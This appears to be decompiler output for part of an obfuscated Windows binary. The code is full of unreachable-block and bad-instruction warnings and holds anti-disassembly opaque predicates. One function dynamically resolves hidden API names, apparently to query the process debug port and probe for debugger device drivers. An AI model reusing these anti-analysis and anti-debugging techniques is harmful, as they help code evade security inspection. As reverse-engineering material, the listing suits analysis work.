/* WARNING: Removing unreachable block (ram,0x00423288) */
/* WARNING: Removing unreachable block (ram,0x00423290) */
/* WARNING: Removing unreachable block (ram,0x00423270) */
/* WARNING: Removing unreachable block (ram,0x00423258) */
/* WARNING: Removing unreachable block (ram,0x00423240) */
/* WARNING: Removing unreachable block (ram,0x0042320f) */
/* WARNING: Removing unreachable block (ram,0x004231d3) */
/* WARNING: Removing unreachable block (ram,0x004231bb) */
/* WARNING: Removing unreachable block (ram,0x004231a3) */
/* WARNING: Removing unreachable block (ram,0x0042318b) */
/* WARNING: Removing unreachable block (ram,0x0042317f) */
/* WARNING: Removing unreachable block (ram,0x00423167) */
/* WARNING: Removing unreachable block (ram,0x0042314f) */
/* WARNING: Removing unreachable block (ram,0x0042310a) */
/* WARNING: Removing unreachable block (ram,0x004230f2) */
/* WARNING: Removing unreachable block (ram,0x004230da) */
/* WARNING: Removing unreachable block (ram,0x004230c2) */
/* WARNING: Removing unreachable block (ram,0x004230aa) */
/* WARNING: Removing unreachable block (ram,0x00423086) */
/* WARNING: Removing unreachable block (ram,0x0042306e) */
/* WARNING: Removing unreachable block (ram,0x00423056) */
/* WARNING: Removing unreachable block (ram,0x0042303e) */
/* WARNING: Removing unreachable block (ram,0x00423026) */
/* WARNING: Removing unreachable block (ram,0x0042301a) */
/* WARNING: Removing unreachable block (ram,0x00423002) */
/* WARNING: Removing unreachable block (ram,0x00422fea) */
/* WARNING: Removing unreachable block (ram,0x00422fc8) */
/* WARNING: Removing unreachable block (ram,0x00422fb0) */
/* WARNING: Removing unreachable block (ram,0x00422f98) */
/* WARNING: Removing unreachable block (ram,0x00422f80) */
/* WARNING: Removing unreachable block (ram,0x00422f38) */
/* WARNING: Removing unreachable block (ram,0x00422f2c) */
/* WARNING: Removing unreachable block (ram,0x00422f14) */
/* WARNING: Removing unreachable block (ram,0x00422f08) */
/* WARNING: Removing unreachable block (ram,0x00422f20) */
/* WARNING: Removing unreachable block (ram,0x00422f5c) */
/* WARNING: Removing unreachable block (ram,0x00422f74) */
/* WARNING: Removing unreachable block (ram,0x00422f8c) */
/* WARNING: Removing unreachable block (ram,0x00422fa4) */
/* WARNING: Removing unreachable block (ram,0x00422fbc) */
/* WARNING: Removing unreachable block (ram,0x00422fd4) */
/* WARNING: Removing unreachable block (ram,0x00422ff6) */
/* WARNING: Removing unreachable block (ram,0x0042300e) */
/* WARNING: Removing unreachable block (ram,0x0042304a) */
/* WARNING: Removing unreachable block (ram,0x00423062) */
/* WARNING: Removing unreachable block (ram,0x0042307a) */
/* WARNING: Removing unreachable block (ram,0x00423092) */
/* WARNING: Removing unreachable block (ram,0x004230b6) */
/* WARNING: Removing unreachable block (ram,0x004230ce) */
/* WARNING: Removing unreachable block (ram,0x004230e6) */
/* WARNING: Removing unreachable block (ram,0x004230fe) */
/* WARNING: Removing unreachable block (ram,0x00423116) */
/* WARNING: Removing unreachable block (ram,0x00423122) */
/* WARNING: Removing unreachable block (ram,0x00423143) */
/* WARNING: Removing unreachable block (ram,0x0042315b) */
/* WARNING: Removing unreachable block (ram,0x00423173) */
/* WARNING: Removing unreachable block (ram,0x004231af) */
/* WARNING: Removing unreachable block (ram,0x004231c7) */
/* WARNING: Removing unreachable block (ram,0x004231df) */
/* WARNING: Removing unreachable block (ram,0x004231f7) */
/* WARNING: Removing unreachable block (ram,0x00423230) */
/* WARNING: Removing unreachable block (ram,0x0042324c) */
/* WARNING: Removing unreachable block (ram,0x00423264) */
/* WARNING: Removing unreachable block (ram,0x0042327c) */
/* WARNING: Removing unreachable block (ram,0x004232bf) */
/* WARNING: Removing unreachable block (ram,0x00423307) */
/* WARNING: Removing unreachable block (ram,0x00423340) */
/* WARNING: Removing unreachable block (ram,0x00423344) */
/* WARNING: Removing unreachable block (ram,0x00423350) */
/* WARNING: Removing unreachable block (ram,0x00423368) */
/* WARNING: Removing unreachable block (ram,0x00423380) */
/* WARNING: Removing unreachable block (ram,0x004233a4) */
/* WARNING: Removing unreachable block (ram,0x004233bc) */
/* WARNING: Removing unreachable block (ram,0x004233e0) */
/* WARNING: Removing unreachable block (ram,0x004233f8) */
/* WARNING: Removing unreachable block (ram,0x0042342c) */
/* WARNING: Removing unreachable block (ram,0x00423438) */
/* WARNING: Removing unreachable block (ram,0x00423450) */
/* WARNING: Removing unreachable block (ram,0x00423468) */
/* WARNING: Removing unreachable block (ram,0x00423254) */
/* WARNING: Removing unreachable block (ram,0x0042323c) */
/* WARNING: Removing unreachable block (ram,0x00423248) */
/* WARNING: Removing unreachable block (ram,0x00423278) */
/* WARNING: Removing unreachable block (ram,0x00423370) */
/* WARNING: Removing unreachable block (ram,0x00423358) */
/* WARNING: Removing unreachable block (ram,0x0042334c) */
/* WARNING: Removing unreachable block (ram,0x004232ef) */
/* WARNING: Removing unreachable block (ram,0x00423364) */
/* WARNING: Removing unreachable block (ram,0x0042337c) */
/* WARNING: Removing unreachable block (ram,0x00422f68) */
/* WARNING: Removing unreachable block (ram,0x00423284) */
/* WARNING: Removing unreachable block (ram,0x0042326c) */
/* WARNING: Removing unreachable block (ram,0x00423388) */
/* WARNING: Removing unreachable block (ram,0x0042338c) */
/* WARNING: Removing unreachable block (ram,0x00423444) */
/* WARNING: Removing unreachable block (ram,0x004231eb) */
/* WARNING: Removing unreachable block (ram,0x0042309e) */
/* WARNING: Removing unreachable block (ram,0x00423032) */
/* WARNING: Removing unreachable block (ram,0x004232cb) */
/* WARNING: Removing unreachable block (ram,0x00423480) */
/* WARNING: Removing unreachable block (ram,0x00423394) */
/* WARNING: Removing unreachable block (ram,0x004233c8) */
/* WARNING: Removing unreachable block (ram,0x00423260) */
/* WARNING: Removing unreachable block (ram,0x00423197) */
/* WARNING: Removing unreachable block (ram,0x00422f44) */
/* WARNING: Removing unreachable block (ram,0x004233a0) */
/* WARNING: Removing unreachable block (ram,0x00423203) */
/* WARNING: Removing unreachable block (ram,0x004233dc) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

int * __thiscall FUN_00422ef1(void *this,undefined4 param_1)

{
  BOOL BVar1;
  byte *pbVar2;
  byte extraout_CL;
  undefined2 extraout_DX;
  bool bVar3;
  undefined8 uVar4;
  undefined1 local_9c [4];
  _OSVERSIONINFOA local_98;

  bVar3 = (POPCOUNT((uint)local_9c & 0xff) & 1U) == 0;
  if ((!bVar3) && (bVar3)) {
                    /* WARNING: Bad instruction - Truncating control flow here */
    halt_baddata();
  }
  local_98.dwOSVersionInfoSize = 0x94;
  BVar1 = GetVersionExA(&local_98);
  if (BVar1 != 0) {
    bVar3 = (POPCOUNT(local_98.dwPlatformId - 1 & 0xff) & 1U) == 0;
    if (local_98.dwPlatformId - 1 == 0) {
      pbVar2 = FUN_00426a10((byte)(undefined2)param_1,extraout_DX);
      return (int *)pbVar2;
    }
    if ((!bVar3) && (bVar3)) {
                    /* WARNING: Bad instruction - Truncating control flow here */
      halt_baddata();
    }
    if ((!bVar3) && (bVar3)) {
                    /* WARNING: Bad instruction - Truncating control flow here */
      halt_baddata();
    }
    if ((!bVar3) && (bVar3)) {
      _DAT_ff7cbd83 = BVar1;
                    /* WARNING: Bad instruction - Truncating control flow here */
      halt_baddata();
    }
    if (local_98.dwPlatformId == 2) {
      uVar4 = FUN_00424ad7(extraout_CL,(undefined2)param_1);
      return (int *)uVar4;
    }
  }
  return (int *)CONCAT22((short)((uint)BVar1 >> 0x10),1);
}



/* VA 0042348c */

/* WARNING: Instruction at (ram,0x00423829) overlaps instruction at (ram,0x00423828)
    */
/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Removing unreachable block (ram,0x004237bf) */
/* WARNING: Removing unreachable block (ram,0x004237c3) */
/* WARNING: Removing unreachable block (ram,0x004237ff) */
/* WARNING: Removing unreachable block (ram,0x004237e7) */
/* WARNING: Removing unreachable block (ram,0x00423923) */
/* WARNING: Removing unreachable block (ram,0x0042390b) */
/* WARNING: Removing unreachable block (ram,0x004238e7) */
/* WARNING: Removing unreachable block (ram,0x004238a2) */
/* WARNING: Removing unreachable block (ram,0x0042388a) */
/* WARNING: Removing unreachable block (ram,0x00423872) */
/* WARNING: Removing unreachable block (ram,0x0042385a) */
/* WARNING: Removing unreachable block (ram,0x0042379e) */
/* WARNING: Removing unreachable block (ram,0x00423786) */
/* WARNING: Removing unreachable block (ram,0x0042376e) */
/* WARNING: Removing unreachable block (ram,0x00423756) */
/* WARNING: Removing unreachable block (ram,0x0042373e) */
/* WARNING: Removing unreachable block (ram,0x00423726) */
/* WARNING: Removing unreachable block (ram,0x0042370e) */
/* WARNING: Removing unreachable block (ram,0x004236f6) */
/* WARNING: Removing unreachable block (ram,0x004236de) */
/* WARNING: Removing unreachable block (ram,0x004236b1) */
/* WARNING: Removing unreachable block (ram,0x00423681) */
/* WARNING: Removing unreachable block (ram,0x00423669) */
/* WARNING: Removing unreachable block (ram,0x00423651) */
/* WARNING: Removing unreachable block (ram,0x00423639) */
/* WARNING: Removing unreachable block (ram,0x00423621) */
/* WARNING: Removing unreachable block (ram,0x00423609) */
/* WARNING: Removing unreachable block (ram,0x004235f1) */
/* WARNING: Removing unreachable block (ram,0x004235e5) */
/* WARNING: Removing unreachable block (ram,0x004235c1) */
/* WARNING: Removing unreachable block (ram,0x004235a9) */
/* WARNING: Removing unreachable block (ram,0x00423591) */
/* WARNING: Removing unreachable block (ram,0x0042356f) */
/* WARNING: Removing unreachable block (ram,0x00423557) */
/* WARNING: Removing unreachable block (ram,0x0042353f) */
/* WARNING: Removing unreachable block (ram,0x00423527) */
/* WARNING: Removing unreachable block (ram,0x0042350f) */
/* WARNING: Removing unreachable block (ram,0x004234f7) */
/* WARNING: Removing unreachable block (ram,0x004234bb) */
/* WARNING: Removing unreachable block (ram,0x004234a3) */
/* WARNING: Removing unreachable block (ram,0x004234af) */
/* WARNING: Removing unreachable block (ram,0x004234c7) */
/* WARNING: Removing unreachable block (ram,0x004234d3) */
/* WARNING: Removing unreachable block (ram,0x004234eb) */
/* WARNING: Removing unreachable block (ram,0x00423503) */
/* WARNING: Removing unreachable block (ram,0x0042351b) */
/* WARNING: Removing unreachable block (ram,0x00423533) */
/* WARNING: Removing unreachable block (ram,0x0042354b) */
/* WARNING: Removing unreachable block (ram,0x00423563) */
/* WARNING: Removing unreachable block (ram,0x00423585) */
/* WARNING: Removing unreachable block (ram,0x0042359d) */
/* WARNING: Removing unreachable block (ram,0x004235b5) */
/* WARNING: Removing unreachable block (ram,0x004235d9) */
/* WARNING: Removing unreachable block (ram,0x00423615) */
/* WARNING: Removing unreachable block (ram,0x0042362d) */
/* WARNING: Removing unreachable block (ram,0x00423645) */
/* WARNING: Removing unreachable block (ram,0x0042365d) */
/* WARNING: Removing unreachable block (ram,0x00423675) */
/* WARNING: Removing unreachable block (ram,0x0042368d) */
/* WARNING: Removing unreachable block (ram,0x00423699) */
/* WARNING: Removing unreachable block (ram,0x004236ea) */
/* WARNING: Removing unreachable block (ram,0x00423702) */
/* WARNING: Removing unreachable block (ram,0x0042371a) */
/* WARNING: Removing unreachable block (ram,0x00423732) */
/* WARNING: Removing unreachable block (ram,0x0042374a) */
/* WARNING: Removing unreachable block (ram,0x00423762) */
/* WARNING: Removing unreachable block (ram,0x0042377a) */
/* WARNING: Removing unreachable block (ram,0x00423792) */
/* WARNING: Removing unreachable block (ram,0x004237aa) */
/* WARNING: Removing unreachable block (ram,0x0042384e) */
/* WARNING: Removing unreachable block (ram,0x00423866) */
/* WARNING: Removing unreachable block (ram,0x0042387e) */
/* WARNING: Removing unreachable block (ram,0x00423896) */
/* WARNING: Removing unreachable block (ram,0x004238db) */
/* WARNING: Removing unreachable block (ram,0x004238ff) */
/* WARNING: Removing unreachable block (ram,0x00423917) */
/* WARNING: Removing unreachable block (ram,0x0042392f) */
/* WARNING: Removing unreachable block (ram,0x004237cb) */
/* WARNING: Removing unreachable block (ram,0x004237cf) */
/* WARNING: Removing unreachable block (ram,0x0042380b) */
/* WARNING: Removing unreachable block (ram,0x00423817) */
/* WARNING: Removing unreachable block (ram,0x004237db) */
/* WARNING: Removing unreachable block (ram,0x004237d7) */
/* WARNING: Removing unreachable block (ram,0x004237e3) */
/* WARNING: Removing unreachable block (ram,0x004237f3) */
/* WARNING: Removing unreachable block (ram,0x00423823) */
/* WARNING: Removing unreachable block (ram,0x00423807) */
/* WARNING: Removing unreachable block (ram,0x004238f3) */
/* WARNING: Removing unreachable block (ram,0x004236a5) */
/* WARNING: Removing unreachable block (ram,0x004235cd) */
/* WARNING: Removing unreachable block (ram,0x004235fd) */
/* WARNING: Removing unreachable block (ram,0x0042393b) */
/* WARNING: Removing unreachable block (ram,0x004238ae) */
/* WARNING: Removing unreachable block (ram,0x004237ef) */
/* WARNING: Removing unreachable block (ram,0x004234df) */
/* WARNING: Removing unreachable block (ram,0x004236bd) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

int * __fastcall FUN_0042348c(byte param_1,undefined2 param_2,undefined4 param_3)

{
  BOOL BVar1;
  int *piVar2;
  uint uVar3;
  _OSVERSIONINFOA local_98;

  local_98.dwOSVersionInfoSize = 0x94;
  BVar1 = GetVersionExA(&local_98);
  if (BVar1 != 0) {
    if (local_98.dwPlatformId == 1) {
      piVar2 = (int *)func_0x0040b7e0(param_3);
      return piVar2;
                    /* WARNING: Bad instruction - Truncating control flow here */
    }
                    /* WARNING: Bad instruction - Truncating control flow here */
    if (local_98.dwPlatformId == 2) {
      uVar3 = func_0x0040b1c0(param_3);
      return (int *)(uVar3 & 0xffff0000);
    }
  }
  return (int *)CONCAT22((short)((uint)BVar1 >> 0x10),1);
}



/* VA 00423950 */

uint __cdecl
FUN_00423950(undefined4 param_1,undefined4 *param_2,uint param_3,undefined4 *param_4,uint param_5)

{
  bool bVar1;
  undefined3 extraout_var;
  uint uVar2;
  undefined3 extraout_var_00;
  uint local_8;

  bVar1 = FUN_004147a3();
  if ((CONCAT31(extraout_var,bVar1) & 0xffff) == 0) {
    uVar2 = 0;
  }
  else {
    uVar2 = FUN_0041488c();
    if ((uVar2 & 0xffff) == 0) {
      uVar2 = 0;
    }
    else {
      uVar2 = FUN_004149ea(param_1,param_2,param_3,&local_8);
      if ((uVar2 & 0xffff) == 0) {
        uVar2 = 0;
      }
      else {
        bVar1 = FUN_00414818();
        if ((CONCAT31(extraout_var_00,bVar1) & 0xffff) == 0) {
          uVar2 = 0;
        }
        else {
          uVar2 = FUN_00414a3f(param_4,param_5,(int *)&local_8);
          if (uVar2 == 0x6e) {
            uVar2 = 1;
          }
          else {
            uVar2 = uVar2 & 0xffff0000;
          }
        }
      }
    }
  }
  return uVar2;
}



/* VA 004239df */

/* WARNING: Instruction at (ram,0x004241ac) overlaps instruction at (ram,0x004241aa)
    */
/* WARNING: Control flow encountered bad instruction data */
/* WARNING (jumptable): Unable to track spacebase fully for stack */
/* WARNING: Removing unreachable block (ram,0x00423fad) */
/* WARNING: Removing unreachable block (ram,0x00423fb1) */
/* WARNING: Removing unreachable block (ram,0x00423c6d) */
/* WARNING: Removing unreachable block (ram,0x00423c71) */
/* WARNING: Removing unreachable block (ram,0x00424060) */
/* WARNING: Removing unreachable block (ram,0x00424191) */
/* WARNING: Removing unreachable block (ram,0x00424173) */
/* WARNING: Removing unreachable block (ram,0x0042415b) */
/* WARNING: Removing unreachable block (ram,0x00424100) */
/* WARNING: Removing unreachable block (ram,0x004240e2) */
/* WARNING: Removing unreachable block (ram,0x004240ca) */
/* WARNING: Removing unreachable block (ram,0x00424093) */
/* WARNING: Removing unreachable block (ram,0x00424038) */
/* WARNING: Removing unreachable block (ram,0x00424020) */
/* WARNING: Removing unreachable block (ram,0x00423ff6) */
/* WARNING: Removing unreachable block (ram,0x00423fea) */
/* WARNING: Removing unreachable block (ram,0x00423fc9) */
/* WARNING: Removing unreachable block (ram,0x00423f78) */
/* WARNING: Removing unreachable block (ram,0x00423f57) */
/* WARNING: Removing unreachable block (ram,0x00423f4b) */
/* WARNING: Removing unreachable block (ram,0x00423f20) */
/* WARNING: Removing unreachable block (ram,0x00423f08) */
/* WARNING: Removing unreachable block (ram,0x00423ec2) */
/* WARNING: Removing unreachable block (ram,0x00423eaa) */
/* WARNING: Removing unreachable block (ram,0x00423e0f) */
/* WARNING: Removing unreachable block (ram,0x00423dde) */
/* WARNING: Removing unreachable block (ram,0x00423dd2) */
/* WARNING: Removing unreachable block (ram,0x00423d50) */
/* WARNING: Removing unreachable block (ram,0x00423d38) */
/* WARNING: Removing unreachable block (ram,0x00423d0c) */
/* WARNING: Removing unreachable block (ram,0x00423cc2) */
/* WARNING: Removing unreachable block (ram,0x00423c79) */
/* WARNING: Removing unreachable block (ram,0x00423c4a) */
/* WARNING: Removing unreachable block (ram,0x00423c32) */
/* WARNING: Removing unreachable block (ram,0x00423c09) */
/* WARNING: Removing unreachable block (ram,0x00423bf1) */
/* WARNING: Removing unreachable block (ram,0x00423b8e) */
/* WARNING: Removing unreachable block (ram,0x00423b76) */
/* WARNING: Removing unreachable block (ram,0x00423b4a) */
/* WARNING: Removing unreachable block (ram,0x00423adf) */
/* WARNING: Removing unreachable block (ram,0x00423aa8) */
/* WARNING: Removing unreachable block (ram,0x00423a90) */
/* WARNING: Removing unreachable block (ram,0x00423a78) */
/* WARNING: Removing unreachable block (ram,0x00423a60) */
/* WARNING: Removing unreachable block (ram,0x00423a48) */
/* WARNING: Removing unreachable block (ram,0x00423a30) */
/* WARNING: Removing unreachable block (ram,0x00423a18) */
/* WARNING: Removing unreachable block (ram,0x00423a00) */
/* WARNING: Removing unreachable block (ram,0x00423a0c) */
/* WARNING: Removing unreachable block (ram,0x00423a24) */
/* WARNING: Removing unreachable block (ram,0x00423a3c) */
/* WARNING: Removing unreachable block (ram,0x00423a54) */
/* WARNING: Removing unreachable block (ram,0x00423a6c) */
/* WARNING: Removing unreachable block (ram,0x00423a84) */
/* WARNING: Removing unreachable block (ram,0x00423a9c) */
/* WARNING: Removing unreachable block (ram,0x00423ab4) */
/* WARNING: Removing unreachable block (ram,0x00423aeb) */
/* WARNING: Removing unreachable block (ram,0x00423af7) */
/* WARNING: Removing unreachable block (ram,0x00423b82) */
/* WARNING: Removing unreachable block (ram,0x00423b9a) */
/* WARNING: Removing unreachable block (ram,0x00423ba6) */
/* WARNING: Removing unreachable block (ram,0x00423be5) */
/* WARNING: Removing unreachable block (ram,0x00423bfd) */
/* WARNING: Removing unreachable block (ram,0x00423c56) */
/* WARNING: Removing unreachable block (ram,0x00423c89) */
/* WARNING: Removing unreachable block (ram,0x00423caa) */
/* WARNING: Removing unreachable block (ram,0x00423ced) */
/* WARNING: Removing unreachable block (ram,0x00423d44) */
/* WARNING: Removing unreachable block (ram,0x00423d5c) */
/* WARNING: Removing unreachable block (ram,0x00423d68) */
/* WARNING: Removing unreachable block (ram,0x00423dc6) */
/* WARNING: Removing unreachable block (ram,0x00423e1b) */
/* WARNING: Removing unreachable block (ram,0x00423e79) */
/* WARNING: Removing unreachable block (ram,0x00423eb6) */
/* WARNING: Removing unreachable block (ram,0x00423ece) */
/* WARNING: Removing unreachable block (ram,0x00423e49) */
/* WARNING: Removing unreachable block (ram,0x00423f14) */
/* WARNING: Removing unreachable block (ram,0x00423f3f) */
/* WARNING: Removing unreachable block (ram,0x00423f84) */
/* WARNING: Removing unreachable block (ram,0x00423f90) */
/* WARNING: Removing unreachable block (ram,0x00423fb9) */
/* WARNING: Removing unreachable block (ram,0x00423fd5) */
/* WARNING: Removing unreachable block (ram,0x0042402c) */
/* WARNING: Removing unreachable block (ram,0x00424044) */
/* WARNING: Removing unreachable block (ram,0x0042407b) */
/* WARNING: Removing unreachable block (ram,0x004240d6) */
/* WARNING: Removing unreachable block (ram,0x004240ee) */
/* WARNING: Removing unreachable block (ram,0x0042410c) */
/* WARNING: Removing unreachable block (ram,0x00424118) */
/* WARNING: Removing unreachable block (ram,0x0042414f) */
/* WARNING: Removing unreachable block (ram,0x00424167) */
/* WARNING: Removing unreachable block (ram,0x00424185) */
/* WARNING: Removing unreachable block (ram,0x00423cce) */
/* WARNING: Removing unreachable block (ram,0x00423fc5) */
/* WARNING: Removing unreachable block (ram,0x00423cbe) */
/* WARNING: Removing unreachable block (ram,0x00423e55) */
/* WARNING: Removing unreachable block (ram,0x00423c85) */
/* WARNING: Removing unreachable block (ram,0x00423c95) */
/* WARNING: Removing unreachable block (ram,0x00423c3e) */
/* WARNING: Removing unreachable block (ram,0x0042419d) */
/* WARNING: Removing unreachable block (ram,0x00423fe6) */
/* WARNING: Removing unreachable block (ram,0x00424002) */
/* WARNING: Removing unreachable block (ram,0x00423fd1) */
/* WARNING: Removing unreachable block (ram,0x00424087) */
/* WARNING: Removing unreachable block (ram,0x00423eda) */
/* WARNING: Removing unreachable block (ram,0x00423d74) */
/* WARNING: Removing unreachable block (ram,0x00423bb2) */
/* WARNING: Removing unreachable block (ram,0x00423b03) */
/* WARNING: Removing unreachable block (ram,0x00423ca6) */
/* WARNING: Removing unreachable block (ram,0x00423e27) */
/* WARNING: Removing unreachable block (ram,0x00423f9c) */
/* WARNING: Removing unreachable block (ram,0x00423ac0) */
/* WARNING: Removing unreachable block (ram,0x004241a9) */
/* WARNING: Removing unreachable block (ram,0x00423efc) */
/* WARNING: Removing unreachable block (ram,0x0042400a) */
/* WARNING: Removing unreachable block (ram,0x0042400e) */
/* WARNING: Removing unreachable block (ram,0x0042409f) */
/* WARNING: Heritage AFTER dead removal. Example location: s0xffffff34 : 0x0042404a */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* WARNING: Restarted to delay deadcode elimination for space: stack */

undefined8 FUN_004239df(void)

{
  uint uVar1;
  HANDLE pvVar2;
  BOOL BVar3;
  undefined2 uVar4;
  uint *puVar5;
  bool bVar6;
  uint *in_stack_00000004;
  undefined4 uVar7;
  int *piVar8;
  undefined4 uVar9;
  int iStack_d8;
  FARPROC pFStack_d4;
  LPCSTR pCStack_d0;
  HANDLE local_cc;
  HMODULE pHStack_c8;
  undefined1 *puStack_c4;
  FARPROC pFStack_c0;
  LPCSTR local_bc;
  uint uStack_b8;
  LPCSTR pCStack_b4;
  LPCSTR pCStack_b0;
  uint local_ac;
  HMODULE pHStack_a8;
  undefined1 *puStack_a4;
  _OSVERSIONINFOA _Stack_a0;
  int local_c;
  ushort uStack_8;

  bVar6 = (POPCOUNT((uint)&iStack_d8 & 0xff) & 1U) == 0;
  local_cc = (HANDLE)0x0;
  if ((!bVar6) && (bVar6)) {
                    /* WARNING: Bad instruction - Truncating control flow here */
    halt_baddata();
  }
  local_c = 1;
  local_ac = CONCAT22(local_ac._2_2_,1);
                    /* WARNING: Bad instruction - Truncating control flow here */
  local_bc = FUN_00420230(&DAT_0042ab80);
  bVar6 = (POPCOUNT((uint)&stack0xffffff1c & 0xff) & 1U) == 0;
  if ((!bVar6) && (bVar6)) {
                    /* WARNING: Bad instruction - Truncating control flow here */
    halt_baddata();
  }
  pHStack_c8 = GetModuleHandleA(local_bc);
  if (pHStack_c8 != (HMODULE)0x0) {
    pCStack_d0 = FUN_00420230((char *)0x42ab90);
                    /* WARNING: Bad instruction - Truncating control flow here */
    pFStack_d4 = GetProcAddress(pHStack_c8,pCStack_d0);
    if (pFStack_d4 != (FARPROC)0x0) {
      uVar9 = 4;
      piVar8 = &local_c;
      uVar7 = 7;
      pvVar2 = GetCurrentProcess();
      iStack_d8 = (*pFStack_d4)(pvVar2,uVar7,piVar8,uVar9);
      if (local_c == 0) {
        local_ac = local_ac & 0xffff0000;
                    /* WARNING: Bad instruction - Truncating control flow here */
      }
    }
  }
  pCStack_b4 = FUN_00420230(&DAT_0042ab00);
                    /* WARNING: Bad instruction - Truncating control flow here */
  pHStack_a8 = GetModuleHandleA(pCStack_b4);
  if (pHStack_a8 != (HMODULE)0x0) {
    pCStack_b0 = FUN_00420230(&DAT_0042ab40);
    bVar6 = (POPCOUNT((uint)&stack0xffffff1c & 0xff) & 1U) == 0;
                    /* WARNING: Bad instruction - Truncating control flow here */
    pFStack_c0 = GetProcAddress(pHStack_a8,pCStack_b0);
    if ((!bVar6) && (bVar6)) {
                    /* WARNING: Bad instruction - Truncating control flow here */
      halt_baddata();
    }
    if (pFStack_c0 != (FARPROC)0x0) {
      puStack_a4 = FUN_00420230((char *)0x42ab10);
      local_cc = (HANDLE)(*pFStack_c0)(puStack_a4,0xc0000000,3);
                    /* WARNING: Bad instruction - Truncating control flow here */
      if (local_cc == (HANDLE)0xffffffff) {
        puStack_c4 = FUN_00420230((char *)0x42ab30);
        local_cc = (HANDLE)(*pFStack_c0)(puStack_c4,0xc0000000,3,0,3);
                    /* WARNING: Bad instruction - Truncating control flow here */
        if (local_cc != (HANDLE)0xffffffff) {
          CloseHandle(local_cc);
        }
      }
      else {
        CloseHandle(local_cc);
      }
    }
  }
  _Stack_a0.dwOSVersionInfoSize = 0x94;
  uStack_b8 = CONCAT22(uStack_b8._2_2_,1);
  BVar3 = GetVersionExA(&_Stack_a0);
                    /* WARNING: Bad instruction - Truncating control flow here */
  if ((BVar3 != 0) && (_Stack_a0.dwPlatformId == 2)) {
    uStack_b8._0_2_ = 0;
    uStack_b8 = 0;
  }
  *in_stack_00000004 = *in_stack_00000004 & (uint)local_cc;
                    /* WARNING: Bad instruction - Truncating control flow here */
  uStack_8 = (ushort)(local_cc != (HANDLE)0xffffffff);
                    /* WARNING: Could not recover jumptable at 0x004240a5. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  uVar4 = 0;
  puVar5 = in_stack_00000004;
  if ((uStack_b8 & 0xffff) != 0) {
    puVar5 = (uint *)(*in_stack_00000004 & 0xf3456732);
    bVar6 = (POPCOUNT(*in_stack_00000004 & 0x32) & 1U) == 0;
    *in_stack_00000004 = (uint)puVar5;
    uStack_8 = 1;
    if ((!bVar6) && (bVar6)) {
                    /* WARNING: Bad instruction - Truncating control flow here */
      halt_baddata();
    }
    uVar4 = (undefined2)((uint)in_stack_00000004 >> 0x10);
  }
  if ((local_ac & 0xffff) != 0) {
    uVar1 = *in_stack_00000004;
    *in_stack_00000004 = uVar1 & 0x53982fea;
    uStack_8 = 1;
    uVar4 = (undefined2)((uVar1 & 0x53982fea) >> 0x10);
    puVar5 = in_stack_00000004;
  }
  return CONCAT44(puVar5,CONCAT22(uVar4,uStack_8));
}



/* VA 004241b5 */

/* WARNING: Instruction at (ram,0x0042468c) overlaps instruction at (ram,0x0042468a)
    */
/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Removing unreachable block (ram,0x00424608) */
/* WARNING: Removing unreachable block (ram,0x004245fc) */
/* WARNING: Removing unreachable block (ram,0x00424470) */
/* WARNING: Removing unreachable block (ram,0x004245f0) */
/* WARNING: Removing unreachable block (ram,0x00424733) */
/* WARNING: Removing unreachable block (ram,0x00424737) */
/* WARNING: Removing unreachable block (ram,0x00424aa7) */
/* WARNING: Removing unreachable block (ram,0x00424a9b) */
/* WARNING: Removing unreachable block (ram,0x00424a83) */
/* WARNING: Removing unreachable block (ram,0x00424a3e) */
/* WARNING: Removing unreachable block (ram,0x00424a26) */
/* WARNING: Removing unreachable block (ram,0x00424a0e) */
/* WARNING: Removing unreachable block (ram,0x004249f6) */
/* WARNING: Removing unreachable block (ram,0x004249de) */
/* WARNING: Removing unreachable block (ram,0x004249c6) */
/* WARNING: Removing unreachable block (ram,0x004249ae) */
/* WARNING: Removing unreachable block (ram,0x00424996) */
/* WARNING: Removing unreachable block (ram,0x0042497e) */
/* WARNING: Removing unreachable block (ram,0x00424966) */
/* WARNING: Removing unreachable block (ram,0x0042494e) */
/* WARNING: Removing unreachable block (ram,0x00424936) */
/* WARNING: Removing unreachable block (ram,0x0042491e) */
/* WARNING: Removing unreachable block (ram,0x00424912) */
/* WARNING: Removing unreachable block (ram,0x004248fa) */
/* WARNING: Removing unreachable block (ram,0x004248e2) */
/* WARNING: Removing unreachable block (ram,0x004248bd) */
/* WARNING: Removing unreachable block (ram,0x004247d6) */
/* WARNING: Removing unreachable block (ram,0x004247be) */
/* WARNING: Removing unreachable block (ram,0x004247a6) */
/* WARNING: Removing unreachable block (ram,0x00424788) */
/* WARNING: Removing unreachable block (ram,0x0042477c) */
/* WARNING: Removing unreachable block (ram,0x0042474f) */
/* WARNING: Removing unreachable block (ram,0x00424716) */
/* WARNING: Removing unreachable block (ram,0x0042470a) */
/* WARNING: Removing unreachable block (ram,0x0042469a) */
/* WARNING: Removing unreachable block (ram,0x0042467d) */
/* WARNING: Removing unreachable block (ram,0x00424614) */
/* WARNING: Removing unreachable block (ram,0x00424583) */
/* WARNING: Removing unreachable block (ram,0x0042450f) */
/* WARNING: Removing unreachable block (ram,0x004244d9) */
/* WARNING: Removing unreachable block (ram,0x004244af) */
/* WARNING: Removing unreachable block (ram,0x00424497) */
/* WARNING: Removing unreachable block (ram,0x0042447c) */
/* WARNING: Removing unreachable block (ram,0x0042444b) */
/* WARNING: Removing unreachable block (ram,0x00424433) */
/* WARNING: Removing unreachable block (ram,0x004243c8) */
/* WARNING: Removing unreachable block (ram,0x004243b0) */
/* WARNING: Removing unreachable block (ram,0x0042438c) */
/* WARNING: Removing unreachable block (ram,0x0042435c) */
/* WARNING: Removing unreachable block (ram,0x00424344) */
/* WARNING: Removing unreachable block (ram,0x00424331) */
/* WARNING: Removing unreachable block (ram,0x00424325) */
/* WARNING: Removing unreachable block (ram,0x0042429c) */
/* WARNING: Removing unreachable block (ram,0x00424254) */
/* WARNING: Removing unreachable block (ram,0x00424214) */
/* WARNING: Removing unreachable block (ram,0x004241fc) */
/* WARNING: Removing unreachable block (ram,0x004241e4) */
/* WARNING: Removing unreachable block (ram,0x004241cc) */
/* WARNING: Removing unreachable block (ram,0x004241d8) */
